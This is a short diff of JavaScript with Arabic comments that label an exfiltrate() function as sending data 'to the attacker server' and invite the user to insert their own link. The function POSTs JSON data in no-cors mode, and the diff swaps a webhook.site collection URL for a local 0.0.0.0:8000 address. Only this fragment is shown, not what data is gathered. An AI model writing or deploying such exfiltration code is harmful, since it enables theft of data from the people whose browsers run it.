@@ -7,7 +7,7 @@
         // دالة لإرسال البيانات إلى السيرفر المهاجم
         async function exfiltrate(data, endpoint) {
             try {
-                await fetch(`https://webhook.site/dc8f1db5-40fe-4891-85c6-b96e1f834bae${endpoint}`, { // <-- استبدل هذا الرابط برابطك
+                await fetch(`http://0.0.0.0:8000/${endpoint}`, { // <-- استبدل هذا الرابط برابطك
                     method: 'POST',
                     mode: 'no-cors', // لتجنب أخطاء CORS
                     body: JSON.stringify(data)
